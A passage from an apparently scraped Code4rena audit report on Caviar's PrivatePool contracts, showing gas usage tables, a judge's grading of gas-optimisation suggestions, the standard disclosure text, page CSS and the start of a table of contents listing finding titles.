class=\"mtk7\">1</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">privatePoolImplementation</span><span class=\"mtk1\">        | </span><span class=\"mtk7\">403</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">403</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">403</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">403</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">privatePoolMetadata</span><span class=\"mtk1\">              | </span><span class=\"mtk7\">426</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">426</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">426</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">426</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">protocolFeeRate</span><span class=\"mtk1\">                  | </span><span class=\"mtk7\">419</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1332</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">419</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2419</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">127</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">receive</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">              | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setPrivatePoolImplementation</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">22744</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">22744</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">22744</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">22744</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">133</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setPrivatePoolMetadata</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">2599</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">22357</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">22634</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">22634</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">127</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setProtocolFeeRate</span><span class=\"mtk1\">               | </span><span class=\"mtk7\">7521</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">9678</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7521</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">22621</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">tokenURI</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">367468</span><span class=\"mtk1\">          | </span><span class=\"mtk7\">367468</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">367468</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">367468</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">withdraw</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">2729</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">12149</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">11128</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">23611</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> |                 |       |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">|------------------------------------------|-----------------|-------|--------|--------|---------|</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Cost</span><span class=\"mtk1\">                          | </span><span class=\"mtk12\">Deployment</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Size</span><span class=\"mtk1\"> |       |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk7\">3097024</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">15926</span><span class=\"mtk1\">           |       |        |        |         |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk10\">Function</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Name</span><span class=\"mtk1\">                            | </span><span class=\"mtk12\">min</span><span class=\"mtk1\">             | </span><span class=\"mtk12\">avg</span><span class=\"mtk1\">   | </span><span class=\"mtk12\">median</span><span class=\"mtk1\"> | </span><span class=\"mtk12\">max</span><span class=\"mtk1\">    | # </span><span class=\"mtk12\">calls</span><span class=\"mtk1\"> |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">404</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">904</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">404</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2404</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">12</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">buy</span><span class=\"mtk1\">                                      | </span><span class=\"mtk7\">1123</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">69821</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">73315</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">157662</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">24</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">buyQuote</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">2282</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">5817</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">4282</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">10782</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">28</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">change</span><span class=\"mtk1\">                                   | </span><span class=\"mtk7\">4723</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">78083</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">111589</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">134100</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">17</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">366</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">366</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">366</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">366</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">changeFeeQuote</span><span class=\"mtk1\">                           | </span><span class=\"mtk7\">3070</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">9202</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">10796</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">10796</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">18</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">793</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">62671</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">13721</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">357344</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">8</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">execute</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">3615</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">18550</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">17976</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">35939</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">6</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">261</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">261</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">261</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">261</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">feeRate</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">375</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">375</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">375</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">375</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">flashFee</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">539</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">1872</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">2539</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2539</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">flashFeeToken</span><span class=\"mtk1\">                            | </span><span class=\"mtk7\">419</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">819</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">419</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">2419</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">flashLoan</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">62820</span><span class=\"mtk1\">           | </span><span class=\"mtk7\">82915</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">82915</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">103011</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">initialize</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">1205</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">62085</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">55637</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">95437</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">147</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\">                              | </span><span class=\"mtk7\">418</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">418</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">418</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">418</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">1</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">385</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">385</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">385</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">385</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">nft</span><span class=\"mtk1\">                                      | </span><span class=\"mtk7\">383</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">383</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">383</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">383</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">6</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">onERC721Received</span><span class=\"mtk1\">                         | </span><span class=\"mtk7\">840</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">840</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">840</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">840</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">151</span><span class=\"mtk1\">     |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">                             | </span><span class=\"mtk7\">393</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">393</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">393</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">393</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">price</span><span class=\"mtk1\">                                    | </span><span class=\"mtk7\">1185</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">3866</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">5185</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5185</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">7</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">receive</span><span class=\"mtk1\">                                  | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">              | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">55</span><span class=\"mtk1\">     | </span><span class=\"mtk7\">33</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">sell</span><span class=\"mtk1\">                                     | </span><span class=\"mtk7\">6077</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">81284</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">49660</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">169661</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">25</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">sellQuote</span><span class=\"mtk1\">                                | </span><span class=\"mtk7\">2407</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">5657</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">4407</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">10907</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">22</span><span class=\"mtk1\">      |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setFeeRate</span><span class=\"mtk1\">                               | </span><span class=\"mtk7\">3384</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">6451</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">6459</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">9503</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setMerkleRoot</span><span class=\"mtk1\">                            | </span><span class=\"mtk7\">9425</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">9425</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">9425</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">9425</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">2</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setPayRoyalties</span><span class=\"mtk1\">                          | </span><span class=\"mtk7\">3406</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">6164</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">6704</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">9504</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setUseStolenNftOracle</span><span class=\"mtk1\">                    | </span><span class=\"mtk7\">3428</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">5628</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">6729</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">6729</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">setVirtualReserves</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">3568</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">7639</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">8530</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">9930</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">4</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">useStolenNftOracle</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">417</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">417</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">417</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">417</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">3</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">virtualBaseTokenReserves</span><span class=\"mtk1\">                 | </span><span class=\"mtk7\">470</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">470</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">470</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">470</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">8</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">virtualNftReserves</span><span class=\"mtk1\">                       | </span><span class=\"mtk7\">465</span><span class=\"mtk1\">             | </span><span class=\"mtk7\">465</span><span class=\"mtk1\">   | </span><span class=\"mtk7\">465</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">465</span><span class=\"mtk1\">    | </span><span class=\"mtk7\">8</span><span class=\"mtk1\">       |</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">| </span><span class=\"mtk12\">withdraw</span><span class=\"mtk1\">                                 | </span><span class=\"mtk7\">3774</span><span class=\"mtk1\">            | </span><span class=\"mtk7\">61038</span><span class=\"mtk1\"> | </span><span class=\"mtk7\">80547</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">80547</span><span class=\"mtk1\">  | </span><span class=\"mtk7\">5</span><span class=\"mtk1\">       |</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/372#issuecomment-1523266431\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>At least 2k gas from SLOADs and the Calldata.</p>\n<p>Will check the rest.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/372#issuecomment-1527531813\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>[G-01] Cache calldata/memory pointers for complex types to avoid offset calculations</strong>   52<br>\nRefactor</p>\n<p><strong>[G-02] Use calldata instead of memory for function arguments that do not get mutated</strong>   4<br>\nLow</p>\n<p><strong>[G-03] State variables can be cached instead of re-reading them from storage</strong>   16<br>\nLow</p>\n<p><strong>[G-04] Cache state variables outside of loop to avoid reading storage on every iteration</strong>   6<br>\nNon-Critical</p>\n<p><strong>[G-05] Rearrange code to fail early</strong>   1<br>\nIgnoring</p>\n<p><strong>[G-06] x += y/x -= y costs more gas than x = x + y/x = x - y for state variables</strong>   2<br>\nNon-Critical</p>\n<p><strong>[G-07] If statements that use &#x26;&#x26; can be refactored into nested if statements</strong>   9<br>\nIgnoring</p>\n<p><strong>[G-08] Use assembly for loops</strong><br>\nRefactor</p>\n<p>Bonus of 5 points because fully benchmarked.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-3\">High Risk Findings (3)</a></p>\n<ul>\n<li><a href=\"#h-01-royalty-receiver-can-drain-a-private-pool\">[H-01] Royalty receiver can drain a private pool</a></li>\n<li><a href=\"#h-02-privatepool-owner-can-steal-all-erc20-and-nft-from-user-via-arbitrary-execution\">[H-02] PrivatePool owner can steal all ERC20 and NFT from user via arbitrary execution</a></li>\n<li><a href=\"#h-03-risk-of-silent-overflow-in-reserves-update\">[H-03] Risk of silent overflow in reserves update</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-17\">Medium Risk Findings (17)</a></p>\n<ul>\n<li><a href=\"#m-01-the-buy-functions-mechanism-enables-users-to-acquire-flash-loans-at-a-cheaper-fee-rate\">[M-01] The buy function’s mechanism enables users to acquire flash loans at a cheaper fee rate.</a></li>\n<li><a href=\"#m-02-ethrouter-cant-perform-multiple-changes\">[M-02] EthRouter can’t perform multiple changes</a></li>\n<li><a href=\"#m-03-flash-loan-fee-is-incorrect-in-private-pool-contract\">[M-03] Flash loan fee is incorrect in Private Pool contract</a></li>\n<li><a href=\"#m-04-changefeequote-will-fail-for-low-decimal-erc20-tokens\">[M-04] <code>changeFeeQuote</code> will fail for low decimal ERC20 tokens</a></li>\n<li><a href=\"#m-05-ethroutersell-ethrouterdeposit-and-ethrouterchange-functions-can-be-dosed-for-some-erc721-tokens\">[M-05] <code>EthRouter.sell</code>, <code>EthRouter.deposit</code>, and <code>EthRouter.change</code> functions can be DOS’ed for some ERC721 tokens</a></li>\n<li><a href=\"#m-06-flashloan-fee-is-not-distributed-to-the-factory\">[M-06] Flashloan fee is not distributed to the factory</a></li>\n<li><a 